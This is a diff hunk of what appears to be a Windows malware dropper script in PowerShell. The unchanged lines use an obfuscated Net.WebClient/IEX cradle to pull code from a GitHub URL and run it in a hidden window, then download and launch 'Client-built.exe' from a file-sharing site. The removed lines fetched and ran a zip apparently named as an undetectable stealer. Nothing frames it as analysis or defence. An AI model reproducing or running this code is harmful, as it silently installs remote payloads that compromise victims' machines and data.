@@ -99,23 +99,6 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/an
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
-$zipUrl = "https://anonsharing.com/file/c98ddc36dd6edf0e/st4al4r_fud.zip"
-$zipPath = "$dir\Downloaded.zip"
-$markerFile = "$dir\extracted.marker"
-
-if (!(Test-Path $dir)) {
-    New-Item -ItemType Directory -Path $dir | Out-Null
-}
-
-if (!(Test-Path $markerFile)) {
-    if (!(Test-Path $zipPath)) {
-        Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
-    }
-    Expand-Archive -Path $zipPath -DestinationPath $dir -Force
-    Remove-Item -Path $zipPath -Force
-    New-Item -ItemType File -Path $markerFile | Out-Null
-}
-Start-Process -FilePath "$dir\st4al4r_fud\Scripts\pythonw.exe" -ArgumentList "$dir\st4al4r_fud\Scripts\loader.py"
 $URL="https://anonsharing.com/file/d231ef5733f21748/Client-built.exe";$Path="$dir\client.exe";Invoke-WebRequest -Uri $URL -OutFile $Path;Start-Process -FilePath $Path
 
 $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
